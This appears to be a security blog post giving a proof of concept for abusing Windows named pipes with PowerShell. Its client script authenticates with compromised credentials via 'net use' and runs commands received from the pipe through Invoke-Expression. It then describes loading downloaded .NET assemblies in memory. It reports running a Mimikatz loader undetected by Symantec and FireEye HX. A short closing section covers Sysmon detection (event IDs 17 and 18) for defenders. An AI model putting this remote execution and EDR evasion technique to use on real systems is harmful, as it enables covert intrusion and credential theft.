                                Names pipes are a Windows feature used for interprocess communication (IPC). It can be used to load the backdoor into memory or inject into a process. Named pipes are used for local processes to communicate with each other. Itâ€™s similar to a TCP session between a client and server. It can be used to provide communication channel between processes on the same computer or between processes on different computers across a network.

                                Cobalt Strike, for example, uses this windows functionnality to transfer data without writing any file on disk. We will try to simulate that method to remotely execute code without writing anything on disk.

                                The scenario that will be presented will focus on 3 machines. <br>
                                <ul>
                                    <li>Attacker system : 192.168.101.12</li>

                                    <li>Client system : 192.168.101.4 - Windows Server 2019</li>

                                The attacker has a remote connection to the compromised system. The compromised system will initialize a pipe called "YahudPipe" and the client system will connect to it.
                            </p>

                                Named pipes can be created with the class <strong>NamedPipeServerStream(Name)</strong> from the namespace <i>System.IO.Pipes</i> <br>
                                A client can connect to a named pipe by creating an object of the class <strong>NamedPipeClientStream(Server, Name)</strong> and calling the method <strong>Connect(Time)</strong> of that object.<br>
                                To send and to receive data on the pipe, we will use a <strong>StreamWriter</strong> object to write data and <strong>StreamReader</strong> object to read the data sent through the pipe. <br>
                                <br>
                                <i style="color: red;">Server code</i>
                                <div class="squarebox">
                                    $pipeName = "YahudPipe"; <br>
                                    $pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName); # Creation new pipe object <br>
                                    Write-Host "Listening on \\.pipe\$pipeName"; <br>
                                    $pipe.WaitForConnection(); <br>
                                    $sr = New-Object System.IO.StreamReader($pipe) # StreamReader read text from a file, from $pipe here <br>
                                    $msg = $sr.ReadLine(); <br>
                                    Write-Host "Message received :", $msg;
                                </div>

                                <i style="color: yellow;">Client code</i>
                                <div class="squarebox">
                                    $pipeServer = "192.168.101.13" <br>
                                    $pipeName = "YahudPipe" <br>
                                    $pipe = New-Object System.IO.Pipes.NamedPipeClientStream($pipeServer, $pipeName) <br>
                                    $pipe.Connect(); <br>
                                    $sw = New-Object System.IO.StreamWriter($pipe); <br>
                                    $msg = Read-Host "Enter your message to send :"; <br>
                                    $sw.WriteLine($msg) <br>
                                </div>

                                Once the connection is done, the exchange of data between the server and the client will be made by two method of the class StreamWriter and StreaReader : <strong>WriteLine(String)</strong> & <strong>ReadLine(String)</strong>.

                                <img src="img/namedpipe/communication_pipe.jpg" class="img-fluid" width="700">

                            <h4 class="mb-0">Authentication</h4>
                            <p>
                                Connecting to the named pipe in local does not require any authentication, but when it comes to a connection through network, a authentication will be necessary. <br>
                                The constructor of the class <strong>NamedPipeClientStream</strong> can take 2 parameters (Server IP, Pipe Name). <br>
                                <div class="squarebox">
                                    Local pipe: <strong>\\.\\PipeName</strong> <br>
                                    Network pipe : <strong>\\[ServerIP]\\PipeName</strong> <br>
                                </div>

                                Without any authentication method, an exception will be caught indicating that the username or password is incorrect. 

                                <img src="img/namedpipe/auth_failed.jpg" class="img-fluid" width="800">

                                A way to authenticate to another system in the network is similar as accessing to a network share of a system. We can use <strong>net use</strong> command to connect to a share resource of a computer in the same network.

                                <div class="squarebox">net use \\[ServerIP] /user:[Username] [Password]</div>

                                Since we suppose that the system that creates the pipe is compromised, the attacker knows the credential of an account of that system, therefore it can use the compromised account to connect to the system that has initialized the pipe. <br>
                                <br>
                                Therefore, on the client script, the attacker can specify those credentials to connect to the pipe.

                                <div class="squarebox">
                                    $auth = "net use \\{0} /user:{1} {2}" -f $pipeServer, $username, $password <br>
                                    Invoke-Expression -Command $auth
                                </div>

                                The cmdlet <strong>Invoke-expression</strong> runs the specified command on the local machine which will authenticate itself to the server.
                            </p>

                            <h4 class="mb-0">Command execution</h4>
                            <p>
                                On the previous section, we've seen that it is possible to send message from the server to client and execute <strong>net use</strong> command to authenticate to another system through network. So with the named pipe functionnalities, the server can send commands to the client and execute it.

                                <img src="img/namedpipe/sending_message.jpg" class="img-fluid" width="700">

                                The method WriteLine() and ReadLine() of the class StreamWriter and StreamReader will send and receive the message through the pipe. <br>
                                <br>
                                <i style="color: red">Server code :</i>
                                <div class="squarebox">
                                    $command = Read-Host "Run command" <br>
                                    $sw.WriteLine($command)
                                </div>
                                <br>
                                <i style="color: yellow;">Client code :</i>
                                <div class="squarebox">
                                    $command = $sr.ReadLine() <br>
                                    Invoke-Expression -Command $command
                                </div>

                                Now if the server want to get the output of the command, we can store the command in a variable and send it through the pipe. <br>
                                <br>
                                <i style="color: yellow;">Client code :</i>

                                    $result = Invoke-Expression -Command $command <br>
                                    $sw.WriteLine($result.Length) # Sending lenght of the command result to Server <br>

                                </div>

                                Example : <strong>Running IPCONFIG</strong>
                                <img src="img/namedpipe/command_exe.jpg" class="img-fluid" width="700">
                                In this example, we ran "ipconfig" to get the ip address information. This also can be a potential "data exfiltration" incident since we could have navigated through different path "C:\Users\[Username]\Documents" or check mapped drives with "<strong>net use</strong>" or check local account "<strong>net user</strong>"...
                            </p>

                                This is probably the most interesting part. Executing code in another computer from our own system. Cobalt Strike uses Windows pipes to communicate between systems in the network. For example, the "keylogger" module is able to send the pressed keys back to the main beacon process. The keylogger module is fully fileless, which makes the detection harder for antiviruses and EDR. The pipes help that communication between the server and the clients without writing on the disk. We will simulate how to load and execute the process in memory to bypass the detection from the antivirus and EDR.

                                In PowerShell, it is possible to run a .NET application executable with the Assembly class from the System.Reflection namespace. .NET application can be application written in C#. To illustrate it, we will start with a simple C# program that will print "Hello World". <br>

                                Compile the .cs file with <strong>csc.exe</strong> to create a assembly file. <br>
                                Then use the <strong>Load()</strong> method from the Assembly class to load the assembly in memory, $assembly.EntryPoint will find the location of the main function and run the program with the method <strong>Invoke()</strong>

                                This code is showing you how to run a .NET application in PowerShell. To adapt this for the pipes, the server has to send the assembly bytes through the pipe, and the client loads the assembly bytes. The server can download the content of an .NET application using (New-Object Net.WebClient).DownloadString(URL) to download the content of an executable file and store it in a variable. Then send the variable through the pipe and the client loads and executes it. <br> <strong>=> Remote Code Execution</strong>

                                Now that we demonstrate how to remotely execute a .NET application from PowerShell, let's make some tests to see if we can bypass some detections. <br>
                                <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PELoaderofMimikatz.cs">PELoaderofMimikatz.cs</a> from S3cur3Th1sSh1t is a version of Mimikatz for .NET application. <br>
                                <br>
                                If the assembly is found on disk, it will be immediately detected by the antivirus, the test has been done with Symantec EndPoint Protection.

                                But what happened if we load it in memory ? Will the antivirus be able to detect it ? <br>

                                Nothing has been written on disk, everything is happening through memory, we store the bytes in the variable and execute the content of that variable to launch .NET application.

                                Boom, we've just executed mimikatz in the client system from the server, <strong>Remote Code Execution</strong>. Mimikatz has been launched, no alert from <strong>Symantec EndPoint Protection</strong> and <strong>FireEye HX</strong>. The server can launch Mimikatz to any client that is connected to the pipes.

                                Without any privilege escalation, we cannot do a LSASS dump, but it is mainly to demonstrate that loading executable in memory is still a huge weakness of antiviruses and EDR.

                            <p>
                                <strong>This section is mainly for FireEye EDR team to improve their detection</strong> <br>
                                <br>
                                As mentionned previously, the detection has not been great for the antivirus and EDR. We have created a named pipe under the name "YahudPipe" and no event has been recorded in the triage of the system from FireEye HX.

                                To detect creation of a named pipe and connection to a named pipe, Sysmon is a tool that is available to monitor it. By filtering the Sysmon log in the event viewer with the ID 17, 18, we might monitor those events. <br>
                                <ul>
                                    <li>Sysmon event id 17 : Pipe creation</li>
                                    <li>Sysmon event id 18 : Pipe connection</li>
                                </ul>

                                The detection has been partially successful. Using accesschk, the connect pipe event has been recorded however the connection of my pipe has not been recorded by the event ID 18. The creation of the pipe "YahudPipe" has been fully recorded.

                            <h4 class="mb-0">Conclusion</h4>
                            <p>
                                Named pipes is a windows functionality that exist for a very long time, it is mainly used to send data from a process to another process. Most of people know the pipe to send the output of a command to the input of another command, such as dir | findstr "cmd.exe", which will send the output of the command "dir" as the input of the command "findstr". On the attack side, it is currently used by Cobalt Strike to exfiltrate data but on the defense side, we are still lacking of detection regarding this windows feature. As shown in this POC, the antivirus and EDR does not detect anything regarding the creation or the connection event of a pipe. Moreover, it give the opportunity for attackers to remotely execute code in memory which is another way to evade antivirus and EDR detection.
